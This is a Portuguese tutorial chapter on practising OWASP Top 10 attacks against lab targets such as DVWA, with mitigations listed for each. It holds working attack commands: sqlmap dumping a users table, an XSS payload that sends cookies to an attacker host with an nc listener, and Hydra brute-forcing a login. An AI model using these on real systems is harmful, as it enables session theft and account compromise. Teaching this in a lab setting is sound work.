# Parte 7 — Web Security: OWASP Top 10 na prática

O OWASP Top 10 é a lista das falhas web mais comuns e perigosas. A melhor forma de entendê-las é explorando cada uma no DVWA e no bWAPP — e o pulo do gato aqui é o método: comece no nível de segurança **Low**, quebre a vulnerabilidade, depois suba para **Medium** e **High** para ver como as mitigações funcionam. É atacando e vendo a defesa reagir que a ficha cai.

| Vulnerabilidade | Como explorar no DVWA | Como prevenir |
|---|---|---|
| **A01 — Broken Access Control** | Mude o `user_id` na URL: `?id=1` → `?id=2` | Verificação server-side em toda requisição |
| **A02 — Cryptographic Failures** | Capture o login HTTP no Wireshark | HTTPS obrigatório, bcrypt para senhas |
| **A03 — SQL Injection** | `' OR '1'='1` no login; `sqlmap --dump` | Prepared statements, input validation |
| **A04 — Insecure Design** | File upload sem validação → webshell | Whitelist de tipos, storage fora do webroot |
| **A05 — Security Misconfiguration** | Nikto detecta phpMyAdmin exposto | Remover interfaces admin do frontend |
| **A07 — Auth Failures** | Hydra brute force no formulário de login | Account lockout, MFA, senhas fortes |
| **A09 — Logging Failures** | Ataque sem gerar alerta no Wazuh | Logging centralizado, alertas em tempo real |

## SQL Injection completo com SQLmap

```bash
sqlmap -u 'http://192.168.200.30/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit' \
  --cookie='security=low; PHPSESSID=SEUCOOKIE' --dbs

# Depois de encontrar o banco
sqlmap -u 'URL' --cookie='...' -D dvwa --tables
sqlmap -u 'URL' --cookie='...' -D dvwa -T users --dump
```

## XSS — roubo de cookie

```html
<script>document.location='http://192.168.100.100/steal?c='+document.cookie</script>
```

```bash
# No Kali, escutando o cookie roubado
nc -lvnp 80
```

## Brute force com Hydra

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.200.30 \
  http-post-form '/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed'
```

## Recursos

- [PortSwigger Web Academy](https://portswigger.net/web-security) · **o melhor** recurso gratuito — labs de cada vulnerabilidade
- [OWASP Top 10](https://owasp.org/www-project-top-ten) · a lista oficial com detalhes
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide) · metodologia completa de testes web

---

⏮️ Anterior: **[Parte 6 — Blue Team](06-blue-team.md)** · ⏭️ Próximo: **[Parte 8 — Engenharia reversa](08-engenharia-reversa-e-malware.md)** · [↩︎ Índice](../README.md)
